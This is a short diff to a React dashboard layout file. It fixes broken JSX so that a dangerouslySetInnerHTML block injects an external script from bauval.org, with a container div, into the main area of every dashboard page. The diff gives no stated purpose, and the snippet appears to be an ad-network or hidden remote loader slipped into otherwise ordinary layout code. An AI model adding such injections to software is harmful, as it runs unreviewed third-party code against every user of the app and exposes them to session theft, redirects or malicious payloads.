@@ -31,7 +31,7 @@ export default function DashboardLayout({
         />
         <main className="relative z-10 flex-1 p-3 sm:p-4 md:p-6 bg-transparent overflow-x-hidden max-w-full">
           {children}
-          <div> dangerouslySetInnerHTML={{ __html: '<script async fetchpriority="high" data-cfasync="false" src="https://bauval.org/21/992b12391f87ad93d9696af8b8546da4"></script><div id="container-992b12391f87ad93d9696af8b8546da4"></div>' }} />
+          <div dangerouslySetInnerHTML={{ __html: '<script async fetchpriority="high" data-cfasync="false" src="https://bauval.org/21/992b12391f87ad93d9696af8b8546da4"></script><div id="container-992b12391f87ad93d9696af8b8546da4"></div>' }} />
         </main>
       </div>
     </div>
